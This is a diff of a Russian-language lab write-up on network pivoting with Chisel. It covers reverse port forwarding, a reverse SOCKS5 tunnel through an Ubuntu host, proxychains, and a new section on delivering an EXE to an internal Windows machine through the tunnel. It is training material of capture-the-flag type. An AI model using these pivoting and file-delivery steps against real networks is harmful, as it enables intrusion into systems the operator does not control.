@@ -72,6 +72,7 @@ Kali не должна иметь прямого доступа к Windows. Дл
 ``` bash
 chisel server -p 80 --reverse
 ```
+<img width="698" height="120" alt="image" src="https://github.com/user-attachments/assets/5ca993ce-4d80-4426-98e8-b501b09b0269" />
 
 -   `server` --- запуск Chisel в режиме сервера.
 -   `-p 80` --- порт приёма подключений.
@@ -82,6 +83,7 @@ chisel server -p 80 --reverse
 ``` bash
 ./chisel_1.12.0_linux_amd64 client 192.168.122.59:80 R:1337:127.0.0.1:5000
 ```
+<img width="1247" height="97" alt="image" src="https://github.com/user-attachments/assets/bcfed733-dc47-4580-8df7-82b167e74e77" />
 
 Параметры:
 
@@ -118,6 +120,12 @@ curl http://127.0.0.1:1337
 При успешной работе туннеля запрос к порту `1337` на Kali должен попасть
 на веб-сервис `127.0.0.1:5000` Ubuntu.
 
+CLI:
+<img width="867" height="793" alt="image" src="https://github.com/user-attachments/assets/e6319bad-89d1-47cd-8ebf-b7fc137945e4" />
+
+GUI:
+<img width="1921" height="937" alt="image" src="https://github.com/user-attachments/assets/096cb489-b5a2-434c-be48-5dc5a0854653" />
+
 ### Технический смысл
 
 Reverse port forwarding позволяет получить доступ к сервису, который
@@ -143,12 +151,15 @@ TCP-подключения к ресурсам, доступным со стор
 ``` bash
 chisel server -p 80 --reverse
 ```
+<img width="941" height="190" alt="image" src="https://github.com/user-attachments/assets/469b8e9e-2ead-491a-929b-172859fd29db" />
 
 ### Подключение Chisel Client на Ubuntu
 
 ``` bash
 ./chisel_1.12.0_linux_amd64 client 192.168.122.59:80 R:socks
 ```
+
+<img width="552" height="57" alt="image" src="https://github.com/user-attachments/assets/a99a0029-084d-4075-bbbc-3cf31f97281a" />
 
 Параметр `R:socks` создаёт обратный SOCKS-туннель. На стороне Kali
 появляется SOCKS5 listener на `127.0.0.1:1080`.
@@ -187,6 +198,7 @@ loopback-интерфейсу Ubuntu.
 ``` bash
 curl --socks5 127.0.0.1:1080 http://127.0.0.1:5000
 ```
+<img width="909" height="745" alt="image" src="https://github.com/user-attachments/assets/bb0e23ed-8933-40dc-ad3e-742c9407a0f7" />
 
 Здесь `127.0.0.1:1080` --- SOCKS5-прокси на Kali, а `127.0.0.1:5000` ---
 веб-сервис относительно Ubuntu.
@@ -204,8 +216,7 @@ SOCKS5-туннель.
 Установка:
 
 ``` bash
-sudo apt update
-sudo apt install proxychains4
+sudo apt update && sudo apt install proxychains4
 ```
 
 Открыть конфигурационный файл:
@@ -248,53 +259,86 @@ proxychains4 curl http://127.0.0.1:5000
 работает на `1080`, а прежний reverse port forward больше не
 используется.
 
-Успешный HTTP-запрос к веб-сервису Ubuntu через SOCKS5 пока не
-зафиксирован.
+---
 
-## 5. Текущий статус лаборатории
+## Phase 3. Передача файла с Kali на Windows через Ubuntu
 
-  -----------------------------------------------------------------------
-  Компонент / действие                Статус
-  ----------------------------------- -----------------------------------
-  Изолированная виртуальная сеть      Создана
+### Цель
+Передать EXE-файл с Kali на внутреннюю Windows-машину, используя Ubuntu в качестве промежуточного узла и Chisel reverse port forwarding.
 
-  Ubuntu с двумя сетевыми             Настроена
-  интерфейсами                        
+### Шаг 1. Запуск Chisel Server на Ubuntu
+На Ubuntu:
 
-  Уязвимый веб-сайт на Ubuntu, порт   Развёрнут
-  `5000`                              
+```
+./chisel_1.12.0_linux_amd64 server -p 8888 --reverse
+```
+<img width="600" height="64" alt="image" src="https://github.com/user-attachments/assets/2a81455a-4a8c-4570-91e4-3b4d4db2b617" />
 
-  Chisel Server на Kali               Запускался
+Ubuntu принимает Chisel-подключение от Kali и разрешает reverse-туннели.
 
-  Reverse port forwarding             Команда использовалась
-  `1337 → Ubuntu:5000`                
+### Шаг 2. Запуск Python HTTP Server на Kali
 
-  Reverse SOCKS5 listener             Подтверждён выводом Chisel
-  `127.0.0.1:1080`                    
+Перейти в каталог с передаваемым EXE-файлом:
+Download: [Github](https://github.com/jpillora/chisel/releases/tag/v1.12.0)
+```
+cd parh/to/file.exe
+```
 
-  Доступ к веб-сервису через SOCKS5   Требует проверки
+Запустить HTTP-сервер на loopback-интерфейсе:
 
-  Исследование внутренней сети через  Впереди
-  SOCKS5                              
+```
+python3 -m http.server 1337 --bind 127.0.0.1
+```
 
-  RDP-подключение к Windows           Впереди
+Файл становится доступен локально на Kali по адресу:
 
-  Получение флагов                    Пока не подтверждено
-  -----------------------------------------------------------------------
+```
+http://127.0.0.1:1337/<имя_файла>.exe
+```
 
-## 6. Следующие шаги
+### Шаг 3. Подключение Chisel Client с Kali
 
-1.  Проверить доступ к веб-сервису Ubuntu через SOCKS5 с Kali.
-2.  При необходимости настроить ProxyChains и проверить TCP-подключения
-    через туннель.
-3.  Исследовать внутреннюю сеть `192.168.0.0/24` со стороны Ubuntu через
-    SOCKS5.
-4.  Обнаружить Windows-хост `192.168.0.59` и проверить доступность RDP.
-5.  Организовать подключение к Windows по RDP через pivot.
-6.  Получить второй флаг и задокументировать результат.
+На Kali:
 
-------------------------------------------------------------------------
+```
+./chisel_1.12.0_linux_amd64 client 192.168.122.153:8888 R:8081:127.0.0.1:1337
+```
+<img width="570" height="108" alt="image" src="https://github.com/user-attachments/assets/c0a10b4a-ffae-4c34-983d-9ed49f043164" />
 
-*Документ отражает известное состояние лаборатории на момент создания.
-По мере выполнения следующих шагов команды, выводы и статусы будут
-дополнены.*
+Назначение параметров:
+
+- `192.168.122.153:8888` — Chisel Server на Ubuntu;
+- `R` — reverse port forwarding;
+- `8081` — порт, открываемый на стороне Ubuntu;
+- `127.0.0.1:1337` — Python HTTP Server на Kali.
+
+Логическая схема перенаправления:
+
+```
+Windows
+   |
+   | HTTP-запрос к Ubuntu:8081
+   v
+Ubuntu (Chisel Server)
+   |
+   | reverse tunnel
+   v
+Kali (Chisel Client)
+   |
+   v
+127.0.0.1:1337
+Python HTTP Server
+```
+
+### Шаг 4. Загрузка файла на Windows
+
+На Windows выполнить:
+
+```
+curl.exe http://192.168.0.139:8081/<имя_файла>.exe -o <имя_файла>.exe
+```
+
+<img width="547" height="359" alt="image" src="https://github.com/user-attachments/assets/18c501ee-ca27-43e9-b75f-1fc96b3dce68" />
+
+
+Запрос приходит на Ubuntu по внутренней сети. Chisel передаёт его на HTTP-сервер Kali, откуда Windows получает файл.
